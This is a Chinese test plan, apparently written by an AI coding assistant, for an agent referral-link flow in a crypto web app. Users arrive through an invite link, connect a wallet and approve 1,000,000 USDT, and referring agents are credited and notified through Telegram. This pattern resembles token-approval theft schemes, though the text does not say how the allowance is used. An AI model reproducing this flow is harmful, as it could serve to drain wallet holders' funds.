# 代理邀请链接注册授权流程测试

## 测试信息

**代理邀请链接：** `http://localhost:3000?ref=AGENT000009`

**代理信息：**
```
ID: 9
代理名称: XL002
代理编码: XL002
邀请码: AGENT000009
当前邀请数: 0
已授权数: 0
状态: active
```

## 完整流程

### 1. 用户访问邀请链接
```
URL: http://localhost:3000?ref=AGENT000009
```

**当前问题：** 前端主页（src/app/page.tsx）**没有读取URL参数ref的逻辑**！

**需要添加：**
```typescript
useEffect(() => {
  // 读取URL参数
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search)
    const ref = params.get('ref')
    if (ref) {
      console.log('🔗 检测到邀请码:', ref)
      setReferralCode(ref)
      // 保存到localStorage以便后续使用
      localStorage.setItem('referralCode', ref)
    }
  }
}, [])
```

### 2. 用户连接钱包
```
点击"Connect Wallet"按钮
→ 调用 AppKit 连接钱包
→ 获取用户地址
```

### 3. 用户注册（可选）
```
调用: POST /api/user/register
Body: {
  wallet_address: "0xUserAddress",
  referralCode: "AGENT000009"
}

后端处理:
  1. 在nh_agents表查找referral_code='AGENT000009'
  2. 找到agent_id=9
  3. 创建用户，设置agent_id=9
  4. 更新代理统计total_invites+1
```

### 4. 用户授权
```
调用: POST /api/user/authorize
Body: {
  wallet_address: "0xUserAddress",
  isAuthorized: true,
  referralCode: "AGENT000009"
}

后端处理:
  1. 查询用户是否存在
  2. 如果用户存在但没有agent_id，根据referralCode更新
  3. 设置approved=1
  4. 更新代理统计valid_invites+1
  5. 发送Telegram通知
```

## 当前代码状态

### 后端API ✓
- ✓ `/api/user/register` - 支持referralCode参数
- ✓ `/api/user/authorize` - 支持referralCode参数
- ✓ 代理查找逻辑正确
- ✓ agent_id设置逻辑正确

### 前端主页 ✗
- ✗ **缺少URL参数读取逻辑**
- ✗ referralCode状态未被使用
- ✗ 授权时未传递referralCode

## 修复方案

### 方案A：添加URL参数读取（推荐）

**文件：** `src/app/page.tsx`

**添加位置：** 在useEffect hooks区域

```typescript
// 读取URL中的邀请码
useEffect(() => {
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search)
    const ref = params.get('ref')
    if (ref) {
      console.log('🔗 检测到邀请码:', ref)
      setReferralCode(ref)
      // 保存到localStorage
      localStorage.setItem('referralCode', ref)
      
      // 可选：从URL中移除ref参数，避免分享时暴露
      // window.history.replaceState({}, '', window.location.pathname)
    } else {
      // 尝试从localStorage读取
      const savedRef = localStorage.getItem('referralCode')
      if (savedRef) {
        console.log('📦 从localStorage读取邀请码:', savedRef)
        setReferralCode(savedRef)
      }
    }
  }
}, [])
```

### 方案B：修改授权逻辑传递referralCode

**找到授权调用的位置，添加referralCode参数：**

```typescript
// 在handleApprove或授权相关函数中
const response = await fetch('/api/user/authorize', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    wallet_address: account,
    isAuthorized: true,
    referralCode: referralCode || localStorage.getItem('referralCode'), // 添加这个
    txHash: txHash,
    amount: amount
  })
})
```

## 测试步骤

### 准备工作
1. 确保前端添加了URL参数读取逻辑
2. 确保授权时传递referralCode
3. 准备一个测试钱包地址

### 步骤1：访问邀请链接
```
打开浏览器
访问: http://localhost:3000?ref=AGENT000009
打开控制台查看日志:
  应该看到: "🔗 检测到邀请码: AGENT000009"
```

### 步骤2：连接钱包
```
点击"Connect Wallet"
选择MetaMask
连接测试钱包
```

### 步骤3：授权USDT
```
点击授权按钮
授权1,000,000 USDT
确认交易
等待交易完成
```

### 步骤4：验证后端
```bash
# 查询用户是否创建且agent_id正确
curl http://localhost:3000/api/admin/users?page=1&limit=20
```

**预期结果：**
```json
{
  "wallet_address": "0xTestAddress",
  "agent_id": 9,
  "agent_name": "XL002",
  "agent_code": "XL002",
  "approved": 1
}
```

### 步骤5：验证代理统计
```sql
SELECT 
  id,
  agent_name,
  total_invites,
  valid_invites
FROM nh_agents
WHERE id = 9;
```

**预期结果：**
```
total_invites: 1 (0 → 1)
valid_invites: 1 (0 → 1)
```

### 步骤6：验证代理后台
```
登录代理后台（XL002账号）
访问: http://localhost:3000/agent/dashboard
查看"我的用户"列表
```

**预期结果：**
- 能看到新注册的用户
- 显示用户地址
- 显示授权状态

## 当前缺失的代码

### 1. 首页URL参数读取
**位置：** `src/app/page.tsx` 约第300行附近

```typescript
// 读取邀请码
useEffect(() => {
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search)
    const ref = params.get('ref')
    if (ref) {
      setReferralCode(ref)
      localStorage.setItem('referralCode', ref)
    }
  }
}, [])
```

### 2. 授权时传递referralCode
**需要找到授权函数并添加referralCode参数**

## 后端API验证

### 测试注册API
```bash
curl -X POST http://localhost:3000/api/user/register \
  -H "Content-Type: application/json" \
  -d '{
    "wallet_address": "0xTestUser20251008",
    "referralCode": "AGENT000009"
  }'
```

**预期响应：**
```json
{
  "success": true,
  "message": "用户注册成功",
  "data": {
    "userId": "uuid",
    "wallet_address": "0xTestUser20251008",
    "agentId": 9,
    "hasAgent": true
  }
}
```

### 测试授权API
```bash
curl -X POST http://localhost:3000/api/user/authorize \
  -H "Content-Type: application/json" \
  -d '{
    "wallet_address": "0xTestUser20251008",
    "isAuthorized": true,
    "referralCode": "AGENT000009",
    "amount": "1000000"
  }'
```

**预期响应：**
```json
{
  "success": true,
  "message": "授权状态更新成功",
  "data": {
    "wallet_address": "0xTestUser20251008",
    "isAuthorized": true
  }
}
```

### 验证数据库
```sql
-- 查询新用户
SELECT 
  id,
  wallet_address,
  agent_id,
  approved,
  created_at
FROM nh_member_new
WHERE wallet_address = '0xTestUser20251008';

-- 查询代理统计
SELECT 
  id,
  agent_name,
  total_invites,
  valid_invites
FROM nh_agents
WHERE id = 9;
```

## 问题诊断

### 如果用户agent_id=0
**可能原因：**
1. 前端没有读取URL参数ref
2. 授权时没有传递referralCode
3. localStorage中没有保存referralCode

**解决方法：**
- 添加URL参数读取逻辑
- 在授权API调用时添加referralCode

### 如果代理统计未更新
**可能原因：**
1. 用户创建失败
2. agent_id设置失败
3. 代理统计更新逻辑有bug

**解决方法：**
- 检查后端日志
- 验证数据库触发器
- 手动运行统计修正SQL

## 手动测试替代方案

### 使用浏览器控制台
```javascript
// 1. 设置邀请码
localStorage.setItem('referralCode', 'AGENT000009')

// 2. 连接钱包后授权时，手动调用
const response = await fetch('/api/user/authorize', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    wallet_address: '当前钱包地址',
    isAuthorized: true,
    referralCode: 'AGENT000009'
  })
})
const result = await response.json()
console.log(result)
```

## 完整修复清单

- [ ] 添加URL参数读取逻辑（src/app/page.tsx）
- [ ] 找到授权函数添加referralCode参数
- [ ] 测试URL参数能否正确读取
- [ ] 测试授权时referralCode能否正确传递
- [ ] 验证用户agent_id正确设置
- [ ] 验证代理统计正确更新
- [ ] 验证代理后台能看到用户

## 下一步行动

我需要：
1. 查找授权函数的具体位置
2. 添加URL参数读取代码
3. 修改授权调用传递referralCode
4. 测试完整流程

是否需要我现在添加这些代码？




